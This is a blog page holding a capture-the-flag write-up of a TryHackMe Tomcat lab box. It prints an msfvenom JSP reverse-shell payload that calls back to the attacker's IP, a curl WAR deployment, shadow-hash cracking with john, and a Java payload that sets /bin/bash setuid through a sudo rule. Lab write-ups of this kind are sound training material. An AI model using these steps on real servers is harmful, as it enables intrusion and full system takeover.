<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <meta name="color-scheme" content="light dark">

    

    <meta name="author" content="monoloc0">
    <meta name="description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Sat Apr 24 07:47:06 2021 as: nmap -sC -sV -oA nmap/output 10.10.124.121 Nmap scan report for 10.10.124.121 Host is up (0.083s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.">
    <meta name="keywords" content="infosec,bugbounty,personal">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content=""/>
<meta name="twitter:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Sat Apr 24 07:47:06 2021 as: nmap -sC -sV -oA nmap/output 10.10.124.121 Nmap scan report for 10.10.124.121 Host is up (0.083s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9."/>

    <meta property="og:title" content="" />
<meta property="og:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Sat Apr 24 07:47:06 2021 as: nmap -sC -sV -oA nmap/output 10.10.124.121 Nmap scan report for 10.10.124.121 Host is up (0.083s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://monoloc0.github.io/vulnnetdotjar/" /><meta property="article:section" content="" />





    <title>
   · monoloc0
</title>

    
      <link rel="canonical" href="https://monoloc0.github.io/vulnnetdotjar/">
    

    <link rel="preload" href="https://monoloc0.github.io/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>

    
      
      
      <link rel="stylesheet" href="https://monoloc0.github.io/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
    

    

    

    

    

    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-16x16.png" sizes="16x16">

    <link rel="apple-touch-icon" href="https://monoloc0.github.io/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://monoloc0.github.io/images/apple-touch-icon.png">

    <meta name="generator" content="Hugo 0.89.4" />
  </head>

  
  
  <body class="preload-transitions colorscheme-light">
    

    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://monoloc0.github.io/">
      monoloc0
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/whoami/">whoami</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/writeups/">writeups</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/resources/">resources</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="https://monoloc0.github.io/vulnnetdotjar/">
          
        </a>
      </h1>
    </header>

    <h1 id="enumeration">
  Enumeration
  <a class="heading-link" href="#enumeration">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<h2 id="port-scan">
  Port Scan
  <a class="heading-link" href="#port-scan">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<style>


pre code {
  background-color: #eee;

}


</style>

<pre tabindex="0"><code># Nmap 7.80 scan initiated Sat Apr 24 07:47:06 2021 as: nmap -sC -sV -oA nmap/output 10.10.124.121
Nmap scan report for 10.10.124.121
Host is up (0.083s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 24 07:47:47 2021 -- 1 IP address (1 host up) scanned in 40.97 seconds
</code></pre><p>After doing an NMAP portscan I tried to access the following link: <code>http://vulnnet.thm:8080</code></p>
<p><img src="https://monoloc0.github.io/images/20210425223235.png" alt="20210425223235.png"></p>
<p>It looks like the <strong>Apache Tomcat</strong> default page.</p>
<p>I tried to login with some default credentials</p>
<ul>
<li>manager:manager</li>
<li>admin:password</li>
<li>admin:admin</li>
<li>admin:</li>
</ul>
<p>But none of those worked.</p>
<p>Next, I asked google:</p>
<p><img src="https://monoloc0.github.io/images/20210425223510.png" alt="20210425223510.png"></p>
<p>It seems like the tomcat server is vulnerable to the <strong>Ghostcat</strong> Vulnerability (File Inclusion Vuln).
<em>(<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a>)</em></p>
<p>As you can see on the following picture, we can read the web.xml</p>
<p><img src="https://monoloc0.github.io/images/20210425223813.png" alt="20210425223813.png"></p>
<p>Found Credentials:
webdev:Hgj3LA$02D$Fa@21</p>
<p>The credentials work, we now have access to the <strong>Server Status</strong> of the Tomcat Server.</p>
<p>Ran gobuster again on: <code>http://vulnnet.thm/manager</code></p>
<p><img src="https://monoloc0.github.io/images/20210426203734.png" alt="20210426203734.png"></p>
<p><em>Note: <code>http://vulnnet.thm/manager</code> returned HTTP 403</em></p>
<p>Can we do somtehing with that?</p>
<p><img src="https://monoloc0.github.io/images/20210426203905.png" alt="20210426203905.png"></p>
<p>Yes, we can ;)</p>
<p><img src="https://monoloc0.github.io/images/20210426204320.png" alt="20210426204320.png"></p>
<p>But can we do something else besides listing the <em>virtual hosts</em>?</p>
<p>Well, we can actually deploy a war file using curl</p>
<ul>
<li>Create Reverse shell</li>
</ul>
<pre tabindex="0"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.7.86 LPORT=4444 -f war &gt; shell.war
  
curl --user &quot;webdev&quot; --upload-file shell.war http://vulnnet.thm:8080/manager/text/deploy?path=/

curl http://vulnnet.thm:8080/shell.war/
</code></pre><p><img src="https://monoloc0.github.io/images/20210426205700.png" alt="20210426205700.png"></p>
<h1 id="enumeration-1">
  Enumeration
  <a class="heading-link" href="#enumeration-1">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>After receiving a reverse shell we are under the context of <em>web</em></p>
<p>Next we need to find a way to escalate privileves in order ot become <em>jdk-admin</em></p>
<p>After running <em>linpeas.sh</em> the following file caught my eye:</p>
<p><img src="https://monoloc0.github.io/images/20210426213102.png" alt="20210426213102.png"></p>
<p>It seems like it is a backup of the shadow file which is readable by <strong>everyone</strong>.</p>
<p>Let&rsquo;s check that out in more detail.</p>
<p><img src="https://monoloc0.github.io/images/20210426213312.png" alt="20210426213312.png"></p>
<p>Nice, we can read the shadow file.</p>
<p>Now, let&rsquo;s try to crack the password hashes.</p>
<pre tabindex="0"><code>john hashes -w=/usr/share/wordlists/rockyou.txt
</code></pre><p>Credentials:</p>
<ul>
<li>jdk-admin:794613852</li>
</ul>
<p><img src="https://monoloc0.github.io/images/20210426214222.png" alt="20210426214222.png"></p>
<p>User.txt: THM{1ae87fa6ec2cd9f840c68cbad78e9351}</p>
<h1 id="pe-to-root">
  PE to root
  <a class="heading-link" href="#pe-to-root">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<pre tabindex="0"><code>jdk-admin@vulnnet-dotjar:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
jdk-admin@vulnnet-dotjar:~$ 

</code></pre><p>**Malicious Java Code
**</p>
<pre tabindex="0"><code>import java.io.*;


class Main {
    public static void main(String[] args) throws Exception {

	Process process;
	process = Runtime.getRuntime().exec(&quot;chmod +s /bin/bash&quot;);

    }
}	
</code></pre><p><strong>Compile java file</strong></p>
<pre tabindex="0"><code>javac Main.java
</code></pre><p><strong>Create jar file</strong></p>
<pre tabindex="0"><code>jar cf payload.jar Main.class
</code></pre><p><img src="https://monoloc0.github.io/images/20210426224000.png" alt="20210426224000.png"></p>
<p>root.txt: THM{464c29e3ffae05c2e67e6f0c5064759c}</p>

  </article>
</section>

  

      </div>

      <footer class="footer">
  <section class="container">
    ©
    
    2021
     monoloc0 


    
  </section>
</footer>

    </main>

    
      
      <script src="https://monoloc0.github.io/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
    

    

    

    

    

    

    

    

    
  </body>

</html>
